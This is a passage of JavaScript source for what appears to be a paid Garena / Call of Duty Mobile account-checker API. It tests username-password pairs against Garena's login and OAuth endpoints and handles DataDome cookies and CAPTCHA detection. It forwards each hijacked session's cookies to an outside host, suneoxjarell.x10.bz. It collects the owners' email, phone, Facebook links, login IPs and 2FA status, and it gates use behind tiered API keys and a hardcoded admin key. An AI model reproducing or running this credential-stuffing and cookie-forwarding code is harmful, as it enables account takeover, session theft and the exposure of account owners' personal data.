             if (e.code === 'ECONNABORTED') return "[⏱️] [CODM FAIL] CODM CHECK SCRIPT TIMEOUT";
             logging.exception(`Error contacting CODM check script:`, e);
             return `[CODM FAIL] SCRIPT REQUEST ERROR: ${err_str.substring(0,100)}`;
        }

    } catch (e) {
        const err_str = strip_ansi_codes(e.message);
        const resp_text = strip_ansi_codes(e.response && e.response.data ? String(e.response.data) : "");
        const status_code = e.response ? e.response.status : null;
        const error_detail = `${err_str.substring(0,100)}` + (status_code ? ` (STATUS: ${status_code})` : "");

        if (detect_captcha_in_response(err_str) || detect_captcha_in_response(resp_text)) {
            logging.warning(`CAPTCHA during CODM callback request error: ${err_str}`);
            return "[🤖] CAPTCHA DETECTED (CODM CALLBACK REQUEST ERROR)";
        }
        if (e.code === 'ECONNABORTED') {
            logging.error("CODM callback request timed out.");
            return "[⏱️] [CODM FAIL] CODM CALLBACK TIMEOUT";
        }
        logging.exception(`CODM callback/token fetch error:`, e);
        return `[CODM FAIL] CALLBACK ERROR: ${error_detail}`;
    }
}


async function check_login(account_username, _id, encryptedpassword, password_for_result, selected_header, cookies, dataa_datadome, date, timeout = REQUEST_TIMEOUT) { // Removed proxies param
    let current_cookies = { ...(cookies || {}) };
    const safe_username = String(account_username || "UNKNOWN_USER").substring(0, 5);

    if (dataa_datadome) {
        current_cookies["datadome"] = dataa_datadome;
    } else {
        logging.info(`No datadome for ${safe_username}, fetching one.`);
        const manual_datadome_result = await get_datadome_cookie(timeout); // Removed proxies
        if (typeof manual_datadome_result === 'string' && !/^\[[🤖⚠️⏱️🔴]\]/.test(manual_datadome_result)) {
            current_cookies["datadome"] = manual_datadome_result;
            logging.info(`Fetched datadome for ${safe_username}.`);
        } else if (manual_datadome_result && manual_datadome_result.startsWith("[🤖]")) {
            logging.warning(`Manual datadome fetch failed (CAPTCHA) for ${safe_username}: ${manual_datadome_result}`);
            return manual_datadome_result;
        } else if (manual_datadome_result) {
            logging.warning(`Manual datadome fetch failed for ${safe_username}: ${manual_datadome_result}.`);
             if (manual_datadome_result.startsWith("[⏱️]") || manual_datadome_result.startsWith("[🔴]")) {
                 return manual_datadome_result;
             }
        } else {
            logging.warning(`Manual datadome fetch for ${safe_username} returned null/empty.`);
        }
    }
    
    const login_params_obj = {
        'app_id': '100082', 'account': account_username, 'password': encryptedpassword,
        'redirect_uri': REDIRECT_URL, 'format': 'json', 'id': _id,
    };
    const login_url_with_params = `${APK_URL}?${urllib.parse.urlencode(login_params_obj)}`;

    let response_login;
    try {
        const cookieString = Object.entries(current_cookies).map(([k, v]) => `${k}=${v}`).join('; ');
        const axiosConfig = {
            headers: { ...(selected_header || {}), 'Cookie': cookieString },
            // Removed proxy config
            timeout: timeout * 1000,
        };
        response_login = await axios.get(login_url_with_params, axiosConfig);
        
    } catch (e) {
        const { raw: response_text_on_error } = parseAxiosResponseData(e.response?.data, "Login error response");
        if (e.response && e.response.status >= 400 && detect_captcha_in_response(response_text_on_error)) {
             logging.warning(`CAPTCHA in login HTTP error ${e.response.status} for ${safe_username}.`);
             return "[🤖] CAPTCHA DETECTED (LOGIN HTTP ERROR BODY)";
        }
        if (e.code === 'ECONNABORTED') {
            const msg = e.message.toLowerCase();
            if (msg.includes('connect etimedout') || msg.includes('connection timed out')) {
                logging.error(`Login connection timed out for ${safe_username}.`);
                return "[⏱️] LOGIN CONNECT TIMEOUT";
            }
            logging.error(`Login read timed out for ${safe_username}.`);
            return "[⏱️] LOGIN READ TIMEOUT";
        }
        if (e.isAxiosError && !e.response) {
            logging.error(`Login connection error for ${safe_username}: ${e.message}`);
            return "[🔴] CONNECTION ERROR - SERVER REFUSED";
        }
        if (e.response) {
            const status_code = e.response.status;
            if (status_code === 403) return "[🚫] LOGIN FORBIDDEN (403)";
            if (status_code === 429) return "[🚦] RATE LIMITED (429)";
            logging.warning(`Login HTTP error ${status_code} for ${safe_username}: ${String(response_text_on_error).substring(0,200)}`);
            return `[📉] LOGIN HTTP ERROR ${status_code}`;
        }
        const err_str = strip_ansi_codes(e.message);
        if (detect_captcha_in_response(err_str)) {
            logging.warning(`CAPTCHA during login request error for ${safe_username}: ${err_str}`);
            return "[🤖] CAPTCHA DETECTED (LOGIN REQUEST ERROR MSG)";
        }
        logging.exception(`Login request failed unexpectedly for ${safe_username}:`, e);
        return `[⚠️] LOGIN REQUEST FAILED: ${err_str.substring(0,100)}`;
    }

    const { data: login_json_response, error: login_parse_error, raw: login_raw_text } = parseAxiosResponseData(response_login.data, "Login response");

    if (detect_captcha_in_response(login_raw_text)) {
        logging.warning(`CAPTCHA IN login response (status ${response_login.status}) for ${safe_username}.`);
        return "[🤖] CAPTCHA DETECTED (LOGIN RESPONSE BODY)";
    }
    if (login_parse_error && !login_json_response) {
        logging.error(`Invalid login JSON for ${safe_username}: ${login_raw_text.substring(0,200)}`);
        return `[💢] INVALID LOGIN JSON RESPONSE (parse_error)`;
    }
    if (!login_json_response) {
        logging.error(`Login response null/undefined for ${safe_username}. Raw: ${login_raw_text.substring(0,200)}`);
        return `[💢] INVALID LOGIN JSON RESPONSE (null_json)`;
    }

    if (login_json_response.error) {
        const error_msg = String(login_json_response.error);
        logging.warning(`Login error field for ${safe_username}: ${error_msg}`);
        if (detect_captcha_in_response(error_msg)) return "[🤖] CAPTCHA REQUIRED (LOGIN ERROR FIELD)";
        if (error_msg.includes("error_password")) return "[⛔] INCORRECT PASSWORD"; 
        if (error_msg.includes("error_account_does_not_exist")) return "[👻] ACCOUNT DOESN'T EXIST";
        if (error_msg.includes("error_account_not_activated")) return "[⏳] ACCOUNT NOT ACTIVATED";
        return `[🚫] LOGIN ERROR: ${error_msg.substring(0, 50)}`;
    }

    if (!login_json_response.session_key) {
         logging.error(`Login response missing session_key for ${safe_username}: ${json.stringify(login_json_response).substring(0,200)}`);
         return "[❌] LOGIN FAILED: NO SESSION KEY";
    }

    const session_key = login_json_response.session_key;
    const newCookiesFromLogin = parseSetCookies(response_login.headers['set-cookie']);
    current_cookies = { ...current_cookies, ...newCookiesFromLogin };
    logging.info(`Garena login successful for ${safe_username}.`);
    
    const acc_info_script_headers = {
        'Host': 'account.garena.com', 'Connection': 'keep-alive',
        'User-Agent': (selected_header && selected_header["User-Agent"]) || "Mozilla/5.0",
        'Accept': 'application/json, text/plain, */*',
        'Referer': `https://account.garena.com/?session_key=${session_key}`,
        'Accept-Language': 'en-US,en;q=0.9',
    };
    if (selected_header) {
        for (const key in selected_header) {
            if (key.toLowerCase().startsWith('sec-ch-ua')) acc_info_script_headers[key] = selected_header[key];
        }
    }

    const acc_info_script_url = 'https://suneoxjarell.x10.bz/jajak.php';
    const params_for_acc_info_script = {};
    for (const [k, v] of Object.entries(current_cookies)) { params_for_acc_info_script[`coke_${k}`] = v; }
    for (const [k, v] of Object.entries(acc_info_script_headers)) {
        const safe_k = k.replace(/-/g, '_').toLowerCase();
        params_for_acc_info_script[`hider_${safe_k}`] = v;
    }

    let init_json_response = null;
    try {
        const init_response = await axios.get(acc_info_script_url, { 
            params: params_for_acc_info_script, 
            // Removed proxy config
            timeout: timeout * 1000 
        });

        const { data: parsed_init_data, raw: init_raw_text } = parseAxiosResponseData(init_response.data, "Account info script response");
        
        if (detect_captcha_in_response(init_raw_text)) {
             logging.warning(`CAPTCHA IN account info script response for ${safe_username}.`);
             return "[🤖] CAPTCHA DETECTED (ACC INFO SCRIPT RESPONSE)";
        }
        if (init_response.status < 200 || init_response.status >=300) {
            throw new Error(`Account info script HTTP Error ${init_response.status}. Body: ${init_raw_text.substring(0,150)}`);
        }
        
        if (parsed_init_data) {
            init_json_response = parsed_init_data;
        } else if (init_raw_text) {
             const json_match = /({.*?})/s.exec(init_raw_text);
             if (json_match && json_match[1]) {
                 try { init_json_response = json.parse(json_match[1]); }
                 catch (e) {
                     logging.error(`Failed parsing JSON in acc info script response for ${safe_username}: ${json_match[1].substring(0,200)} - Error: ${e.message}`);
                     return `[🧩] FAILED ACC INFO PARSE (EMBEDDED JSON INVALID)`;
                 }
             } else {
                 logging.error(`Failed parsing acc info for ${safe_username}: ${init_raw_text.substring(0,200)}`);
                 return `[🧩] FAILED ACC INFO PARSE (NO VALID JSON)`;
             }
        } else {
            logging.error(`Account info script empty/unparseable for ${safe_username}. Status: ${init_response.status}`);
            return `[🧩] FAILED ACC INFO PARSE (EMPTY/UNPARSABLE)`;
        }

    } catch (e) {
        const err_str = strip_ansi_codes(e.message);
        const resp_text = strip_ansi_codes(e.response && e.response.data ? String(e.response.data) : "");
        if (detect_captcha_in_response(err_str) || detect_captcha_in_response(resp_text)) {
            logging.warning(`CAPTCHA during acc info script request error for ${safe_username}: ${err_str}`);
            return "[🤖] CAPTCHA DETECTED (ACC INFO SCRIPT REQUEST ERROR)";
        }
        if (e.code === 'ECONNABORTED') {
            logging.error(`Account info script timed out for ${safe_username}`);
            return "[⏱️] ACCOUNT INFO SCRIPT TIMEOUT";
        }
        logging.exception(`Account info script request failed for ${safe_username}:`, e);
        return `[📡] ACC INFO SCRIPT REQUEST FAILED: ${err_str.substring(0,100)}`;
    }

    if (typeof init_json_response !== 'object' || init_json_response === null) {
        logging.error(`Account info processing failed - not an object for ${safe_username}`);
        return "[🧩] FAILED ACC INFO PROCESS (INVALID STRUCTURE)";
    }

    if (init_json_response.error || init_json_response.success === false ) {
        const error_detail = init_json_response.error || init_json_response.message || 'Unknown error from acc info script';
        const clean_error_detail = strip_ansi_codes(String(error_detail));
        logging.warning(`Account info script returned error for ${safe_username}: ${clean_error_detail}`);
        if (detect_captcha_in_response(clean_error_detail)) {
            return "[🤖] CAPTCHA REQUIRED (ACC INFO SCRIPT ERROR FIELD)";
        }
        return `[❓] ACC INFO ERROR: ${clean_error_detail.substring(0,150)}`;
    }
    
    const bindings = init_json_response.bindings || [];
    const account_status = strip_ansi_codes(String(init_json_response.status || 'Unknown'));
    let country = "N/A", last_login = "N/A", last_login_where = "N/A", avatar_url = "N/A";
    let fb_name = "N/A", fb_link = "N/A", mobile = "N/A", email = "N/A";
    let facebook_bound = "False", email_verified = "False", authenticator_enabled = "False", two_step_enabled = "False";
    let shell = "0", ckz_count = "UNKNOWN", last_login_ip = "N/A";

    if (Array.isArray(bindings)) {
        for (const binding_item_str of bindings) {
            const binding_clean = strip_ansi_codes(String(binding_item_str));
            if (binding_clean.includes(":")) {
                try {
                    const [key_raw, ...value_parts] = binding_clean.split(":");
                    const key = key_raw.trim().toLowerCase(); 
                    const value = value_parts.join(":").trim();
                    if (!value) continue;
                    
                    if (key === "country") country = value;
                    else if (key === "lastlogin" && !key.includes("from") && !key.includes("ip")) last_login = value;
                    else if (key === "lastloginfrom") last_login_where = value;
                    else if (key === "lastloginip") last_login_ip = value;
                    else if (key === "ckz") ckz_count = value;
                    else if (key === "garena shells") shell = (/\d+/.exec(value) || ["0"])[0];
                    else if (key === "facebook account" && value !== "N/A") { fb_name = value; facebook_bound = "True"; }
                    else if (key === "fb link") fb_link = value;
                    else if (key === "avatar") avatar_url = value;
                    else if (key === "mobile number" && value !== "N/A") mobile = value;
                    else if (key === "tae") email_verified = value.toLowerCase().includes("yes") ? "True" : "False";
                    else if (key === "eta" && value !== "N/A") email = value;
                    else if (key === "authenticator") authenticator_enabled = value.toLowerCase().includes("enabled") ? "True" : "False";
                    else if (key === "two-step verification") two_step_enabled = value.toLowerCase().includes("enabled") ? "True" : "False";
                } catch (parse_err) {
                    logging.warning(`Error parsing binding line for ${safe_username}: '${binding_clean.substring(0,50)}...' - ${parse_err.message}`);
                }
            }
        }
    } else {
        logging.warning(`Bindings data not an array for ${safe_username}: ${String(bindings).substring(0,100)}`);
    }
    
    if (!country || ["N/A", "UNKNOWN", "NONE", ""].includes(String(country).toUpperCase())) {
        country = "UNKNOWN";
        if (last_login_where && last_login_where !== "N/A") {
            const llw_upper = last_login_where.toUpperCase();
            const parts = llw_upper.split(',').map(p => p.trim());
            const potential_country_from_llw = parts[parts.length - 1];
            const mapped_from_llw = GARENA_COUNTRY_MAP[potential_country_from_llw];
            if (mapped_from_llw) country = mapped_from_llw;
            else {
                for (const p_part of parts) {
                    if (GARENA_COUNTRY_MAP[p_part]) { country = GARENA_COUNTRY_MAP[p_part]; break; }
                }
            }
        }
    } else {
        const normalized = GARENA_COUNTRY_MAP[String(country).toUpperCase()];
        country = normalized || String(country).toUpperCase();
    }
    
    const grant_cookies = {};
    ['datadome', 'sso_key'].forEach(key => {
        if (current_cookies[key]) grant_cookies[key] = current_cookies[key];
    });

    const grant_headers = {
        "Host": "auth.garena.com", "Connection": "keep-alive",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
        "Origin": "https://auth.garena.com", "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty",
        "Referer": "https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=" + urllib.parse.quote(REDIRECT_URL),
        "Accept-Encoding": "gzip, deflate, br, zstd", "Accept-Language": "en-US,en;q=0.9",
        "User-Agent": (selected_header && selected_header["User-Agent"]) || "Mozilla/5.0",
    };
    if (selected_header) {
        for (const key in selected_header) {
            if (key.toLowerCase().startsWith('sec-ch-ua')) grant_headers[key] = selected_header[key];
        }
    }
    const grant_data_payload_obj = {"client_id": "100082", "response_type": "token", "redirect_uri": REDIRECT_URL, "format": "json", "id": _id};
    const grant_data_payload_str = urllib.parse.urlencode(grant_data_payload_obj);

    let grant_response;
    try {
        const grant_url = "https://auth.garena.com/oauth/token/grant";
        const cookieStringGrant = Object.entries(grant_cookies).map(([k, v]) => `${k}=${v}`).join('; ');

        grant_response = await axios.post(grant_url, grant_data_payload_str, {
            headers: { ...grant_headers, 'Cookie': cookieStringGrant },
            // Removed proxy config
            timeout: timeout * 1000
        });
        
        const { data: grant_data_json, error: grant_parse_error, raw: grant_raw_text } = parseAxiosResponseData(grant_response.data, "Grant token response");

        if (detect_captcha_in_response(grant_raw_text)) {
            logging.warning(`CAPTCHA IN grant token response for ${safe_username}.`);
            return "[🤖] CAPTCHA DETECTED (GRANT TOKEN RESPONSE BODY)";
        }
        if (grant_parse_error && !grant_data_json) {
            logging.error(`Invalid grant token JSON for ${safe_username}: ${grant_raw_text.substring(0,200)}`);
            return `[📄] GRANT TOKEN FAILED: NON-JSON RESPONSE (${grant_parse_error.message.substring(0,50)})`;
        }
        if (!grant_data_json) {
            logging.error(`Grant token response null/undefined for ${safe_username}. Raw: ${grant_raw_text.substring(0,200)}`);
            return `[📄] GRANT TOKEN FAILED: NULL JSON RESPONSE`;
        }

        if (grant_data_json.error) {
            const error_msg = String(grant_data_json.error);
            logging.warning(`Grant token error field for ${safe_username}: ${error_msg}`);
            if (detect_captcha_in_response(error_msg)) return "[🤖] CAPTCHA REQUIRED (GRANT TOKEN ERROR FIELD)";
            return `[🔑] GRANT TOKEN FAILED: ${error_msg.substring(0,50)}`;
        }

        if (!grant_data_json.access_token) {
            logging.error(`Grant token response missing access_token for ${safe_username}: ${json.stringify(grant_data_json).substring(0,200)}`);
            return "[❓] GRANT TOKEN MISSING 'access_token'";
        }

        const access_token = grant_data_json.access_token;
        const newCookiesFromGrant = parseSetCookies(grant_response.headers['set-cookie']);
        current_cookies = { ...current_cookies, ...newCookiesFromGrant };
        logging.info(`Access token granted for ${safe_username}.`);
        
        const codm_check_cookies = {};
        ['datadome', 'sso_key', 'token_session'].forEach(key => {
            if (current_cookies[key]) codm_check_cookies[key] = current_cookies[key];
        });
        
        const codm_result_str = await show_level(access_token, selected_header, codm_check_cookies, timeout); // Removed proxies

        if (codm_result_str.startsWith("[🤖]")) {
             logging.warning(`CODM check returned CAPTCHA for ${safe_username}: ${codm_result_str}`);
             return codm_result_str;
        }
        if (/^\[(CODM FAIL|CODM WARN|⏱️)\]/.test(codm_result_str)) {
            logging.warning(`CODM check failed/warned for ${safe_username}: ${codm_result_str}`);
            return ["CODM_FAILURE", account_username, password_for_result, codm_result_str];
        }

        let codm_nickname = "N/A", codm_level_str = "N/A", codm_region = "N/A", uid = "N/A";
        const connected_games_list_for_json = [];

        if (typeof codm_result_str === 'string' && codm_result_str.includes("|") && codm_result_str.split("|").length === 4) {
            const parts = codm_result_str.split("|");
            [codm_nickname, codm_level_str, codm_region, uid] = parts.map(p => p.trim());
            
            if (/^\d+$/.test(codm_level_str) && codm_nickname && codm_region && uid &&
               ![codm_nickname, codm_region, uid].some(p => !p || p.toLowerCase() === "n/a")) {
                connected_games_list_for_json.push({
                    "game": "CODM", "region": codm_region, "level": codm_level_str,
                    "nickname": codm_nickname, "uid": uid
                });
            } else {
                const reason = `[CODM WARN] PARSED INVALID CODM DATA: ${codm_result_str.substring(0,100)}`;
                logging.warning(`CODM check for ${safe_username}: ${reason}`);
                return ["CODM_FAILURE", account_username, password_for_result, reason];
            }
        } else {
            const reason = `[CODM WARN] UNEXPECTED CODM DATA: ${String(codm_result_str).substring(0,100)}`;
            logging.warning(`CODM check for ${safe_username}: ${reason}`);
            return ["CODM_FAILURE", account_username, password_for_result, reason];
        }
        
        const result_dict = format_result_dict(
            last_login, last_login_where, country, shell, avatar_url, mobile,
            facebook_bound, email_verified, authenticator_enabled, two_step_enabled,
            connected_games_list_for_json, fb_name, fb_link, email, date,
            account_username, password_for_result,
            ckz_count, last_login_ip, account_status
        );
        logging.info(`Full check successful for ${safe_username}. CODM Level: ${codm_level_str}`);
        return result_dict;

    } catch (e) {
        const { raw: grant_text_on_error } = parseAxiosResponseData(e.response?.data, "Grant token error response");
        const err_str = strip_ansi_codes(e.message);
        
        if (detect_captcha_in_response(err_str) || detect_captcha_in_response(grant_text_on_error)) {
            logging.warning(`CAPTCHA during grant token request error for ${safe_username}: ${err_str}`);
            return "[🤖] CAPTCHA DETECTED (GRANT TOKEN REQUEST ERROR)";
        }
        if (e.code === 'ECONNABORTED') {
            logging.error(`Grant token request timed out for ${safe_username}`);
            return "[⏱️] GRANT TOKEN REQUEST TIMEOUT";
        }
        logging.exception(`Grant token request error for ${safe_username}:`, e);
        return `[🌐] GRANT TOKEN REQUEST ERROR: ${err_str.substring(0,100)}`;
    }
}

function format_result_dict(last_login, last_login_where, country, shell_str, avatar_url, mobile,
                       facebook_bound_str, email_verified_str, authenticator_enabled_str, two_step_enabled_str,
                       connected_games_data, fb_name, fb_link, email, date_timestamp,
                       username, password,
                       ckz_count, last_login_ip, account_status) {
    
    let codm_info_json = {"status": "NO CODM INFO PARSED", "level": null};
    if (Array.isArray(connected_games_data) && connected_games_data.length > 0) {
        const game_data = connected_games_data[0];
        if (game_data && game_data.game === "CODM") {
            let level_val = null;
            try { level_val = parseInt(game_data.level, 10); if(isNaN(level_val)) level_val = null; }
            catch (e) { /* ignore */ }
            codm_info_json = {
                "status": "LINKED", "game": "CODM", 
                "region": game_data.region || null,
                "level": level_val, 
                "nickname": game_data.nickname || null, 
                "uid": game_data.uid || null
            };
        }
    }

    let shell_value = 0;
    try { shell_value = parseInt(shell_str, 10); if(isNaN(shell_value)) shell_value = 0; }
    catch (e) { /* ignore */ }

    function clean_na(value) {
        const sVal = String(value);
        return (value && !["N/A", "UNKNOWN", ""].includes(sVal.toUpperCase())) ? value : null;
    }

    const result_data = {
        "checker_by": "S1N | TG: @YISHUX",
        "timestamp_utc": DateTime.now().toISO(),
        "check_run_id": date_timestamp,
        "username": username, 
        "password": password, // IMPORTANT: Removed by API handler
        "account_status_garena": clean_na(account_status),
        "account_country": clean_na(country),
        "garena_shells": shell_value,
        "avatar_url": clean_na(avatar_url),
        "last_login_time": clean_na(last_login),
        "last_login_location": clean_na(last_login_where),
        "last_login_ip": clean_na(last_login_ip),
        "bindings": {
            "mobile_number": clean_na(mobile),
            "email_address": clean_na(email),
            "facebook_name": clean_na(fb_name),
            "facebook_link": clean_na(fb_link),
        },
        "security": {
            "mobile_bound": !!clean_na(mobile),
            "email_verified": email_verified_str === "True",
            "facebook_linked": facebook_bound_str === "True",
            "google_authenticator_enabled": authenticator_enabled_str === "True",
            "two_step_verification_enabled": two_step_enabled_str === "True",
        },
        "codm_details": codm_info_json,
        "ckz_count": ckz_count !== "UNKNOWN" ? clean_na(ckz_count) : null,
    };
    return result_data;
}

async function check_account(username, password, date_timestamp, initial_cookies_tuple, datadome_for_prelogin_attempt = null, timeout = REQUEST_TIMEOUT) { // Removed proxies param
    const safe_username = String(username || "UNKNOWN_USER").substring(0, 5);
    try {
        const random_id = String(random.randint(100000000000, 999999999999));
        const [initial_cookies_from_system, headers_template] = get_request_data(initial_cookies_tuple); 
        let prelogin_request_cookies = { ...initial_cookies_from_system };

        if (datadome_for_prelogin_attempt) {
            prelogin_request_cookies['datadome'] = datadome_for_prelogin_attempt;
        }

        const params_obj_prelogin = {"app_id": "100082", "account": username, "format": "json", "id": random_id};
        const prelogin_url = "https://auth.garena.com/api/prelogin";
        let v1 = null, v2 = null;
        let encrypted_password_val = null;
        let datadome_from_prelogin_response = null;
        let response_prelogin = null;

        try {
            const cookieStringPrelogin = Object.entries(prelogin_request_cookies).map(([k, v]) => `${k}=${v}`).join('; ');
            response_prelogin = await axios.get(prelogin_url, {
                params: params_obj_prelogin,
                headers: { ...(headers_template || {}), 'Cookie': cookieStringPrelogin },
                // Removed proxy config
                timeout: timeout * 1000
            });
            
            const newCookiesFromPrelogin = parseSetCookies(response_prelogin.headers['set-cookie']);
            datadome_from_prelogin_response = newCookiesFromPrelogin['datadome'] || null;

        } catch (e) {
            const { raw: prelogin_text_on_error } = parseAxiosResponseData(e.response?.data, "Prelogin error response");
            if (e.response && e.response.status >= 400 && detect_captcha_in_response(prelogin_text_on_error)) {
                 logging.warning(`CAPTCHA in prelogin HTTP error ${e.response.status} for ${safe_username}.`);
                 return "[🤖] CAPTCHA DETECTED (PRELOGIN HTTP ERROR BODY)";
            }
            if (e.code === 'ECONNABORTED') {
                logging.error(`Prelogin timed out for ${safe_username}: ${e.message}`);
                return "[⏱️] PRELOGIN TIMED OUT";
            }
            if (e.response) {
                 const status_code = e.response.status;
                 if (status_code === 403) return `[🚫] PRELOGIN FORBIDDEN (403)`;
                 if (status_code === 429) return "[🚦] PRELOGIN RATE LIMITED (429)";
                 logging.warning(`Prelogin HTTP error ${status_code} for ${safe_username}: ${String(prelogin_text_on_error).substring(0,200)}`);
                 return `[📉] PRELOGIN HTTP ERROR ${status_code}`;
            }
            const err_str = strip_ansi_codes(e.message);
            if (detect_captcha_in_response(err_str)) {
                 logging.warning(`CAPTCHA during prelogin request error for ${safe_username}: ${err_str}`);
                 return "[🤖] CAPTCHA DETECTED (PRELOGIN REQUEST ERROR MSG)";
            }
            // Removed specific proxy error check as proxy is removed
            logging.exception(`Prelogin request failed unexpectedly for ${safe_username}:`, e);
            return `[🔌] PRELOGIN REQUEST FAILED: ${err_str.substring(0,100)}`; // Kept [🔌] as generic connection issue
        }

        const { data: data_prelogin, error: prelogin_parse_error, raw: prelogin_raw_text } = parseAxiosResponseData(response_prelogin.data, "Prelogin response");

        if (detect_captcha_in_response(prelogin_raw_text)) {
            logging.warning(`CAPTCHA IN prelogin response (status ${response_prelogin.status}) for ${safe_username}.`);
            return "[🤖] CAPTCHA DETECTED (PRELOGIN RESPONSE BODY)";
        }
        if (prelogin_parse_error && !data_prelogin) {
            logging.error(`Invalid prelogin JSON for ${safe_username}: ${prelogin_raw_text.substring(0,200)}`);
            return `[🧩] INVALID PRELOGIN JSON (parse_error)`;
        }
        if (!data_prelogin) {
            logging.error(`Prelogin response null/undefined for ${safe_username}. Raw: ${prelogin_raw_text.substring(0,200)}`);
            return `[🧩] INVALID PRELOGIN JSON (null_json)`;
        }

        if (data_prelogin.error) {
            const error_msg = String(data_prelogin.error);
            logging.warning(`Prelogin error field for ${safe_username}: ${error_msg}`);
            if (detect_captcha_in_response(error_msg)) return "[🤖] CAPTCHA REQUIRED (PRELOGIN ERROR FIELD)";
            if (error_msg === 'error_account_does_not_exist') return "[👻] ACCOUNT DOESN'T EXIST";
            return `[❗] PRELOGIN ERROR: ${error_msg.substring(0,50)}`;
        }

        v1 = data_prelogin.v1;
        v2 = data_prelogin.v2;
        if (!v1 || !v2) {
            logging.error(`Prelogin data missing v1/v2 for ${safe_username}: ${json.stringify(data_prelogin).substring(0,200)}`);
            return "[⚠️] PRELOGIN DATA MISSING (V1/V2)";
        }

        encrypted_password_val = get_encrypted_password(password, v1, v2);
        
        let datadome_for_login_step = null;
        if (datadome_from_prelogin_response && typeof datadome_from_prelogin_response === 'string' &&
           !/^\[[🤖⚠️]\]/.test(datadome_from_prelogin_response)) {
            datadome_for_login_step = datadome_from_prelogin_response;
            save_datadome_to_storage(datadome_for_login_step);
        } else if (datadome_for_prelogin_attempt) {
            datadome_for_login_step = datadome_for_prelogin_attempt;
        }
        
        let login_step_cookies = { ...initial_cookies_from_system };
        if (response_prelogin && response_prelogin.headers['set-cookie']) {
            const newCookiesFromPreloginAgain = parseSetCookies(response_prelogin.headers['set-cookie']);
            for (const cookieName in newCookiesFromPreloginAgain) {
                if (cookieName.toLowerCase() !== 'datadome') {
                    login_step_cookies[cookieName] = newCookiesFromPreloginAgain[cookieName];
                }
            }
        }
        
        return await check_login(
            username, random_id,
            encrypted_password_val,
            password,
            headers_template, 
            login_step_cookies,
            datadome_for_login_step, 
            date_timestamp, /* removed proxies */ timeout
        );

    } catch (e) {
        const err_str = strip_ansi_codes(e.message);
        if (detect_captcha_in_response(err_str)) {
            logging.warning(`CAPTCHA during unexpected error in check_account for ${safe_username}.`);
            return "[🤖] CAPTCHA DETECTED (check_account UNEXPECTED)";
        }
        if (e instanceof ReferenceError && (e.message.includes('encrypted_password') || e.message.includes('encryptedpassword'))) {
            logging.critical(`CRITICAL: Password encryption variable not defined in check_account for ${safe_username}. Error: ${e.message}`, e);
            return "[💥] INTERNAL ERROR: PASSWORD ENCRYPTION STATE INVALID.";
        }
        logging.exception(`Unexpected error in check_account for ${safe_username}:`, e);
        return `[💥] UNEXPECTED ERROR (check_account): ${err_str.substring(0,100)}`;
    }
}

function htmlEscape(text) {
    if (typeof text !== 'string') return String(text);
    return text.replace(/&/g, '&').replace(/</g, '<').replace(/>/g, '>').replace(/"/g, '"').replace(/'/g, ''');
}


// --- Express API Setup ---
const express = require('express');
const apiKeyManager = require('./api_keys_manager');
const app = express();
const PORT = parseInt(process.env.PORT, 10) || 3000;

app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true, limit: '1mb' }));

const apiKeyMiddleware = async (req, res, next) => {
    const apiKeyInput = req.query.apikey || req.body.apikey || req.headers['x-api-key'];
    const apiKeyPreview = (typeof apiKeyInput === 'string' && apiKeyInput.length > 0) 
        ? `${apiKeyInput.substring(0, Math.min(5, apiKeyInput.length))}...` : '[EMPTY/INVALID_KEY]';

    if (!apiKeyInput || typeof apiKeyInput !== 'string') {
        logging.warning(`API call with missing/invalid API key. Preview: ${apiKeyPreview}`);
        return res.status(401).json({ error: "API key required (string)." });
    }

    try {
        const validationResult = await apiKeyManager.validateAndConsumeApiKey(apiKeyInput);
        if (!validationResult || !validationResult.valid) {
            const message = (validationResult && validationResult.message) ? validationResult.message : "API key validation failed.";
            const status = (validationResult && validationResult.status) ? validationResult.status : 403;
            logging.warning(`API key validation failed for '${apiKeyPreview}': ${message}`);
            return res.status(status).json({ error: message });
        }
        req.apiKeyData = validationResult.keyData;
        logging.info(`API key '${apiKeyPreview}' (User: ${validationResult.keyData.userId}, Tier: ${validationResult.keyData.tierName}) validated for ${req.path}. Usage: ${validationResult.keyData.checksMade || 0}/${validationResult.keyData.checkLimit || 'N/A'}`);
        next();
    } catch (error) {
        logging.exception(`Error during API key validation for '${apiKeyPreview}':`, error);
        res.status(500).json({ error: "Internal error during API key validation." });
    }
};

const ADMIN_MASTER_KEY = process.env.ADMIN_MASTER_KEY || "sinluna";

const adminAuthMiddleware = (req, res, next) => {
    const masterKey = req.headers['x-admin-key'];
    if (masterKey === ADMIN_MASTER_KEY) {
        next();
    } else {
        logging.warning(`Admin endpoint access denied. Path: ${req.path}. Key: ${masterKey ? masterKey.substring(0,3)+'...' : 'N/A'}`);
        res.status(403).json({ error: "Forbidden: Admin access required." });
    }
};


app.all('/api/check', apiKeyMiddleware, async (req, res) => {
    const user = req.query.user || req.body.user;
    const pass = req.query.password || req.body.password;
    // Proxy parameter removed
    // const proxyParam = req.query.proxy || req.body.proxy; 

    const safeUser = String(user || "").substring(0,3);
    logging.info(`/api/check called by user ${req.apiKeyData.userId} (key: ${req.apiKeyData.apiKey.substring(0,5)}...). Checking: ${safeUser}...`);

    if (!user || !pass) {
        logging.warning(`/api/check: Missing user/password for ${safeUser}.`);
        return res.status(400).json({ error: "User and password are required." });
    }
    if (typeof user !== 'string' || typeof pass !== 'string') {
        logging.warning(`/api/check: User/password not strings for ${safeUser}.`);
        return res.status(400).json({ error: "User and password must be strings." });
    }

    // Proxy logic removed
    // let proxyForCheck = null;
    // if (proxyParam) { ... }

    try {
        const date_timestamp_for_check = get_current_timestamp();
        const session_initial_cookies_tuple = starting_cookies();
        
        const result = await check_account(
            user,
            pass,
            date_timestamp_for_check,
            session_initial_cookies_tuple,
            // proxyForCheck, // Removed
            null, 
            REQUEST_TIMEOUT
        );

        if (typeof result === 'object' && result !== null && !Array.isArray(result)) {
            const displayLevel = (result.codm_details && result.codm_details.level !== null) ? result.codm_details.level : "N/A";
            logging.info(`/api/check: Success for ${safeUser}. CODM Level: ${displayLevel}`);
            delete result.password; // IMPORTANT: Remove password
            return res.status(200).json({ status: "success", data: result });
        } else if (Array.isArray(result) && result[0] === "CODM_FAILURE") {
            const [, fail_user, , fail_reason_raw] = result;
            const fail_reason = strip_ansi_codes(String(fail_reason_raw));
